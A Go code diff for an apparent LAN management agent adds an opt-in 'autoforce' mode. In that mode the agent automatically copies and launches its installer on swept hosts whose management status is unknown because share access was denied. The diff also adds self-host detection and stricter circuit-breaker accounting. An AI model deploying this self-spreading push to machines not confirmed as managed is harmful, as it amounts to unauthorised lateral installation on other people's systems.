@@ -266,6 +266,9 @@ type NMSConfig struct {
 	ExtraHosts    []string `json:"extra_hosts"`
 	Exclude       []string `json:"exclude"`
 	AutoClone     bool     `json:"autoclone"`
+	// AutoForce extends the auto arm to managed-unknown hosts (default
+	// off — explicit opt-in per NMS; unknown stays skipped otherwise).
+	AutoForce     bool     `json:"autoforce"`
 	MaxParallel   int      `json:"max_parallel"`
 	FailThreshold int      `json:"fail_threshold"`
 	FailWindowMin int      `json:"fail_window_min"`
@@ -312,6 +315,7 @@ func LoadNMSConfig() NMSConfig {
 		cfg.Exclude = f.Exclude
 	}
 	cfg.AutoClone = f.AutoClone
+	cfg.AutoForce = f.AutoForce
 	if f.MaxParallel >= 1 && f.MaxParallel <= 32 {
 		cfg.MaxParallel = f.MaxParallel
 	}
@@ -352,7 +356,7 @@ func SetNMS(args string, seedExclude []string) (string, error) {
 	for _, f := range fields {
 		kv := strings.SplitN(f, "=", 2)
 		if len(kv) != 2 {
-			return "", fmt.Errorf("usage: set-nms key=value [key=value...] (interval, sweep_min, subnets, extra_hosts, exclude, autoclone, max_parallel, fail_threshold, fail_window_min, rearm_min)")
+			return "", fmt.Errorf("usage: set-nms key=value [key=value...] (interval, sweep_min, subnets, extra_hosts, exclude, autoclone, autoforce, max_parallel, fail_threshold, fail_window_min, rearm_min)")
 		}
 		k := strings.ToLower(strings.TrimSpace(kv[0]))
 		v := strings.TrimSpace(kv[1])
@@ -386,6 +390,14 @@ func SetNMS(args string, seedExclude []string) (string, error) {
 				cfg.AutoClone = false
 			} else {
 				return "", fmt.Errorf("autoclone must be on|off")
+			}
+		case "autoforce", "autoforce=on", "autoforce=off":
+			if k == "autoforce=on" || strings.EqualFold(v, "on") || strings.EqualFold(v, "true") || strings.EqualFold(v, "1") {
+				cfg.AutoForce = true
+			} else if k == "autoforce=off" || strings.EqualFold(v, "off") || strings.EqualFold(v, "false") || strings.EqualFold(v, "0") {
+				cfg.AutoForce = false
+			} else {
+				return "", fmt.Errorf("autoforce must be on|off")
 			}
 		case "max_parallel":
 			n, err := strconv.Atoi(v)
@@ -703,6 +715,19 @@ func remoteStatsCIMCred(host string, timeout time.Duration) (float64, float64, f
 	return r.CPU, r.Mem, r.Disk, nil
 }
 
+// isSelfHostIn reports whether host is one of ours (pure, tested).
+func isSelfHostIn(host string, self []string) bool {
+	for _, s := range self {
+		if strings.EqualFold(strings.TrimSpace(s), strings.TrimSpace(host)) {
+			return true
+		}
+	}
+	return false
+}
+
+// isSelfHost checks against this box's live addresses.
+func isSelfHost(host string) bool { return isSelfHostIn(host, selfIPs()) }
+
 // ProbeHost probes one host fully (bounded by caller). The managed-hint
 // share read and the CIM stats query run concurrently: serially they cost up
 // to ~33s per host and stall whole cycles on big LANs.
@@ -720,6 +745,13 @@ func ProbeHost(host string) NMSHostResult {
 	}()
 	go func() {
 		defer wg.Done()
+		// Own addresses report local gopsutil numbers (a loopback CIM
+		// query only produces red-herring WinRM errors on green cards).
+		if isSelfHost(host) {
+			c, m, d := SelfStats()
+			r.CPU, r.Mem, r.Disk = c, m, d
+			return
+		}
 		c, m, d, err := remoteStatsCIM(host, 25*time.Second)
 		if err != nil {
 			r.StatsErr = err.Error()
@@ -1334,6 +1366,11 @@ func startCloneJob(host, wantVer string, forced bool) (state string, started boo
 		if st == "cloned-verified" {
 			nmsRecordSuccess()
 		}
+		// Forced failures count double toward the breaker: unknown-territory
+		// pushes fail more often, so the storm guard trips sooner on them.
+		if forced && (st == "copy-failed" || st == "launch-failed") {
+			nmsRecordFail()
+		}
 	}()
 	return "cloning", true
 }
@@ -1364,6 +1401,8 @@ type NMSReport struct {
 	Sleep     *NMSSleepState  `json:"sleep,omitempty"`
 	Guard     string          `json:"guard"`
 	CloneArm  string          `json:"clone_arm"`
+	// AutoForce mirrors config: dashboard badges whole-LAN forcing.
+	AutoForce bool            `json:"autoforce"`
 	Priv      *NMSPriv        `json:"priv,omitempty"`
 	Results   []NMSHostResult `json:"results"`
 	Events    []string        `json:"events,omitempty"`
@@ -1427,6 +1466,9 @@ func StepNMS(send func(reportJSON string), controllerIPs []string) error {
 	var selfSkipped []string
 	if cfg.AutoClone && !CloneArmPaused() {
 		cloneArm = "scanning"
+		if cfg.AutoForce {
+			cloneArm = "scanning+force"
+		}
 		self := selfIPs()
 		size, _, ok := NMSInstallerInfo()
 		_ = size
@@ -1435,11 +1477,8 @@ func StepNMS(send func(reportJSON string), controllerIPs []string) error {
 			if strings.HasSuffix(r.Host, "(self)") {
 				continue
 			}
-			if r.ManagedUnknown {
-				r.CloneState = "skip-managed-unknown"
-				r.CloneDetail = "share read denied - refusing to guess"
-				continue
-			}
+			// Gates first (reachable, listed, self, controller, proven-
+			// managed): force never bypasses any of these, auto or manual.
 			elig, reason := CloneEligible(r.Host, r.Reachable, r.ManagedHint, cfg.Exclude, self, controllerIPs)
 			if !elig {
 				r.CloneState = "skip-" + reason
@@ -1449,6 +1488,27 @@ func StepNMS(send func(reportJSON string), controllerIPs []string) error {
 				if reason == "self" {
 					r.CloneDetail = "this box - never targeted"
 					selfSkipped = append(selfSkipped, r.Host)
+				}
+				continue
+			}
+			if r.ManagedUnknown {
+				// Share denied: skip unless auto-force opted in (whole-LAN
+				// force). Proven-managed never reaches here (gated above).
+				if !cfg.AutoForce {
+					r.CloneState = "skip-managed-unknown"
+					r.CloneDetail = "share read denied - refusing to guess"
+					continue
+				}
+				if !ok {
+					r.CloneState = "no-payload"
+					continue
+				}
+				st, started := startCloneJob(r.Host, version.Version, true)
+				r.CloneState = st
+				if started {
+					r.CloneDetail = "auto-forced job started (operator opted in)"
+				} else {
+					r.CloneDetail = "auto-forced job tracked"
 				}
 				continue
 			}
@@ -1492,7 +1552,7 @@ func StepNMS(send func(reportJSON string), controllerIPs []string) error {
 	rep := NMSReport{
 		Prober: hn, At: time.Now().UTC().Format(time.RFC3339),
 		Tick: tick, Version: version.Version, Interval: cfg.IntervalSec,
-		Sleep: sleep, Guard: guard, CloneArm: cloneArm, Priv: &priv,
+		Sleep: sleep, Guard: guard, CloneArm: cloneArm, AutoForce: cfg.AutoForce, Priv: &priv,
 		Results: results, Events: events, SelfSkipped: selfSkipped,
 	}
 	b, _ := json.Marshal(rep)
@@ -1984,8 +2044,13 @@ func nmsStatus() string {
 		sleep = "ASLEEP since " + st.Since.Format(time.RFC3339) + " (" + st.Reason + ")"
 	}
 	arm := "off"
+	autoforce := "autoforce=off"
 	if cfg.AutoClone {
 		arm = "scanning"
+		if cfg.AutoForce {
+			arm = "scanning+force"
+			autoforce = "autoforce=ON (whole-LAN unknowns force-clone)"
+		}
 		if CloneArmPaused() {
 			arm = "paused-breaker"
 		}
@@ -1993,8 +2058,8 @@ func nmsStatus() string {
 	arp := arpSeedHosts()
 	targets := dedupeHosts(append(append(append([]string{}, currentSweep()...), arp...), cfg.ExtraHosts...))
 	priv := CurrentNMSPriv()
-	return fmt.Sprintf("nms tick=%d version=%s interval=%ds agent=%s clone-arm=%s payload=%s targets=%d sweep=%d arp=%d priv=%s/elev=%v/%s admin=%v",
+	return fmt.Sprintf("nms tick=%d version=%s interval=%ds agent=%s clone-arm=%s payload=%s targets=%d sweep=%d arp=%d priv=%s/elev=%v/%s admin=%v %s",
 		NMSTick(), version.Version, cfg.IntervalSec, sleep, arm, payload,
 		len(targets), len(currentSweep()), len(arp),
-		priv.User, priv.Elevated, priv.Integrity, priv.IsAdmin)
+		priv.User, priv.Elevated, priv.Integrity, priv.IsAdmin, autoforce)
 }
